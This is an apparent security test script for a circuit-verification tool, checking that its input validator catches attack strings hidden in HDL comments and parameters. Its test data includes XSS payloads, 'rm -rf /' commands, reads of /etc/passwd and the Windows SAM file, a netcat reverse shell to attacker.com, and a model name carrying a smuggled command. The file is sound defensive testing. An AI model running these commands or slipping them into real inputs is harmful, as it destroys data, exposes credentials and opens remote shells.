#!/usr/bin/env python3
"""Enhanced security test for formal-circuits-gpt."""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from formal_circuits_gpt.core import CircuitVerifier
from formal_circuits_gpt.security.input_validator import InputValidator, SecurityError

def test_enhanced_attack_patterns():
    """Test enhanced security patterns detection."""
    print("🔒 Testing Enhanced Security Patterns...")
    
    validator = InputValidator(strict_mode=True)
    attack_patterns = [
        # Web attack patterns
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        'vbscript:msgbox(1)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        
        # Code injection patterns
        'eval("malicious_code")',
        'exec("os.system(\'rm -rf /\')")',
        'system("rm -rf /")',
        'shell_exec("cat /etc/passwd")',
        'passthru("nc -e /bin/sh attacker.com 4444")',
        
        # Command execution patterns
        '`rm -rf /`',
        '${PATH}',
        '%USERPROFILE%',
        
        # Path traversal patterns
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
    ]
    
    detected_count = 0
    total_count = len(attack_patterns)
    
    for pattern in attack_patterns:
        test_hdl = f"""
        module test();
            // {pattern}
            wire test_signal;
        endmodule
        """
        
        result = validator.validate_hdl_content(test_hdl)
        if not result.is_valid:
            detected_count += 1
            print(f"  ✅ Detected: {pattern[:30]}...")
        else:
            print(f"  ❌ Missed: {pattern[:30]}...")
    
    detection_rate = (detected_count / total_count) * 100
    print(f"  📊 Detection rate: {detection_rate:.1f}% ({detected_count}/{total_count})")
    
    return detection_rate >= 80.0  # 80% threshold for success

def test_parser_resilience():
    """Test parser resilience against malformed inputs."""
    print("🛡️ Testing Parser Resilience...")
    
    verifier = CircuitVerifier()
    malformed_inputs = [
        # Null bytes and control characters
        "module test\x00\x01\x02();",
        
        # Missing semicolons
        """module test()
        wire a
        wire b
        assign a = b
        endmodule""",
        
        # Incomplete structures
        "module incomplete(",
        "assign missing_target =",
        "always @(",
        
        # Excessive nesting (should be handled gracefully)
        "module test(); " + "begin " * 100 + "end " * 100 + " endmodule",
        
        # Random binary data
        "\xff\xfe\x00\x00malformed\x80\x90\xa0",
        
        # Unicode confusion
        "module tеst(); // Cyrillic 'e' in test",
        
        # Very long lines
        "module test(); wire " + "x" * 10000 + "; endmodule",
    ]
    
    recovered_count = 0
    total_count = len(malformed_inputs)
    
    for i, malformed_input in enumerate(malformed_inputs):
        try:
            result = verifier.verify(malformed_input)
            if result.status in ["VERIFIED", "FAILED"]:  # Any result is better than crash
                recovered_count += 1
                print(f"  ✅ Recovered from malformed input {i+1}")
            else:
                print(f"  ⚠️ Partial recovery from malformed input {i+1}")
                recovered_count += 0.5
        except Exception as e:
            print(f"  ❌ Failed on malformed input {i+1}: {str(e)[:50]}...")
    
    recovery_rate = (recovered_count / total_count) * 100
    print(f"  📊 Recovery rate: {recovery_rate:.1f}% ({recovered_count}/{total_count})")
    
    return recovery_rate >= 70.0  # 70% threshold for success

def test_input_sanitization():
    """Test input sanitization effectiveness."""
    print("🧹 Testing Input Sanitization...")
    
    validator = InputValidator(strict_mode=False)  # Non-strict mode to test sanitization
    dangerous_inputs = [
        'module test(); `system("echo hacked"); endmodule',
        'module test(); $display("leaked data"); endmodule',
        'module test(); /* <script>alert(1)</script> */ endmodule',
        'module test(); // javascript:void(0)',
        'module test\x00\x01\x02(); endmodule',
    ]
    
    sanitized_count = 0
    
    for dangerous_input in dangerous_inputs:
        result = validator.validate_hdl_content(dangerous_input)
        if result.sanitized_input and result.sanitized_input != dangerous_input:
            sanitized_count += 1
            print(f"  ✅ Sanitized dangerous content")
        else:
            print(f"  ❌ Failed to sanitize dangerous content")
    
    sanitization_rate = (sanitized_count / len(dangerous_inputs)) * 100
    print(f"  📊 Sanitization rate: {sanitization_rate:.1f}%")
    
    return sanitization_rate >= 60.0  # 60% threshold for success

def test_comprehensive_validation():
    """Test comprehensive validation of all input types."""
    print("🔍 Testing Comprehensive Validation...")
    
    validator = InputValidator(strict_mode=True)
    test_cases = [
        # Valid cases
        ("valid_model", "gpt-4-turbo", True),
        ("valid_prover", "isabelle", True),
        ("valid_temp", 0.1, True),
        ("valid_timeout", 300, True),
        
        # Invalid cases
        ("invalid_model", "hacker-model; rm -rf /", False),
        ("invalid_prover", "malicious_prover", False),
        ("invalid_temp", 5.0, False),
        ("invalid_timeout", -1, False),
    ]
    
    passed_count = 0
    
    for test_name, value, should_be_valid in test_cases:
        try:
            if "model" in test_name:
                result = validator.validate_model_name(str(value))
            elif "prover" in test_name:
                result = validator.validate_prover_name(str(value))
            elif "temp" in test_name:
                result = validator.validate_temperature(value)
            elif "timeout" in test_name:
                result = validator.validate_timeout(value)
            
            if result.is_valid == should_be_valid:
                passed_count += 1
                print(f"  ✅ {test_name}: Expected {should_be_valid}, got {result.is_valid}")
            else:
                print(f"  ❌ {test_name}: Expected {should_be_valid}, got {result.is_valid}")
                
        except Exception as e:
            if not should_be_valid:
                passed_count += 1
                print(f"  ✅ {test_name}: Exception caught as expected")
            else:
                print(f"  ❌ {test_name}: Unexpected exception: {e}")
    
    validation_rate = (passed_count / len(test_cases)) * 100
    print(f"  📊 Validation accuracy: {validation_rate:.1f}%")
    
    return validation_rate >= 90.0  # 90% threshold for success

def main():
    """Run enhanced security tests."""
    print("=== Enhanced Security Test Suite ===\n")
    
    tests = [
        ("Attack Pattern Detection", test_enhanced_attack_patterns),
        ("Parser Resilience", test_parser_resilience),
        ("Input Sanitization", test_input_sanitization),
        ("Comprehensive Validation", test_comprehensive_validation),
    ]
    
    passed_tests = 0
    total_tests = len(tests)
    
    for test_name, test_func in tests:
        try:
            if test_func():
                print(f"✅ PASS: {test_name}")
                passed_tests += 1
            else:
                print(f"❌ FAIL: {test_name}")
        except Exception as e:
            print(f"❌ ERROR: {test_name}: {e}")
        print()
    
    success_rate = (passed_tests / total_tests) * 100
    print("=" * 50)
    print(f"📋 ENHANCED SECURITY TEST RESULTS:")
    print(f"  ✅ PASS: {passed_tests}/{total_tests} tests")
    print(f"  📊 Success Rate: {success_rate:.1f}%")
    
    if success_rate >= 75.0:
        print("🎉 Enhanced security validation PASSED!")
        return True
    else:
        print("⚠️ Enhanced security validation needs improvement")
        return False

if __name__ == "__main__":
    main()